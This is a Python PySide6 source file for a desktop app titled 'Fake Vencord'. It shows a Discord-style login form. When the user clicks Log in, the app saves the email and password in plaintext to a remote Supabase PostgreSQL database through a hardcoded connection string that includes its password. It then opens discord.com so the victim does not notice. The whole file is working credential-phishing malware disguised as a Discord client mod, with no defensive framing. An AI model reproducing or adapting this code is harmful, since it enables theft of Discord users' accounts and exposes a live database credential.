import os
import sys

from PySide6.QtCore import QSize, QUrl

from PySide6.QtWebEngineWidgets import QWebEngineView
from PySide6.QtWidgets import QApplication, QMainWindow, QLabel, QTextEdit, QWidget, QPushButton, QStackedWidget
from PySide6.QtGui import QPixmap, Qt, QTransform
import psycopg2


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Fake Vencord")
        self.setFixedSize(1600, 890)


        self.__connection = psycopg2.connect("postgresql://postgres:boykisser_owo@db.xogfzilynvmgmaayasou.supabase.co:5432/postgres")
        self.__cursor = self.__connection.cursor()
        self.__cursor.execute(
            """
            create table if not exists tomas (
                id serial primary key,
                email text not null,
                password text not null
            );
            """
        )


        self.stacked = QStackedWidget(self)
        self.setCentralWidget(self.stacked)


        container = QWidget()
        self.stacked.addWidget(container)



        self.label = QLabel(container)
        self.label.setGeometry(0, 0, 1600, 890)
        self.label.setAlignment(Qt.AlignCenter)

        self.label2 = QLabel(container)

        base_dir = os.path.dirname(os.path.abspath(__file__))
        image_path = os.path.join(base_dir, "../assets/icon.png")
        image2 = os.path.join(base_dir, "../assets/squaree.png")
        print("Loading image from:", image_path)

        pixmap = QPixmap(image_path)
        if pixmap.isNull():
            print("Failed to load image")
            self.label.setText("Image not found")
        else:
            self.label.setPixmap(pixmap.scaled(1600, 890, Qt.KeepAspectRatioByExpanding, Qt.SmoothTransformation))

        pixmap2 = QPixmap(image2)
        if pixmap2.isNull():
            print("Failed to load image")
            self.label2.setText("Image not found")

        else:
            q = QSize(340, 265)

            transform = QTransform()
            transform.rotate(270)

            self.label2.setPixmap(pixmap2.scaled(q).transformed(transform))

        self.text_edit = QTextEdit(container)
        a: int = 250*2.07
        b: int = 150*2.6
        self.label2.setGeometry(a+335, b-115, self.label2.sizeHint().width(), self.label2.sizeHint().height())
        self.text_edit.setGeometry(a-5, b, 350, 35)

        self.text_edit2 = QTextEdit(container)
        self.text_edit2.setGeometry(a-5, b+70, 350, 35)

        self.button = QPushButton(container)
        self.button.setGeometry(a-5, b+135, 340, 50)
        self.button.setText("Log in")
        self.button.clicked.connect(self.onButtonClicked)

    def onButtonClicked(self):
        email = self.text_edit.toPlainText()
        password = self.text_edit2.toPlainText()
        self.__cursor.execute(
            "insert into tomas (email, password) values (%s, %s)", (email, password)
        )
        self.__connection.commit()
        print(f"{email} | {password}")

        self.webview = QWebEngineView()
        self.webview.load(QUrl("https://discord.com/app"))
        self.stacked.addWidget(self.webview)
        self.stacked.setCurrentIndex(1)


if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    with open("resources/style.qss", "r") as file:
        app.setStyleSheet(file.read())
    sys.exit(app.exec())
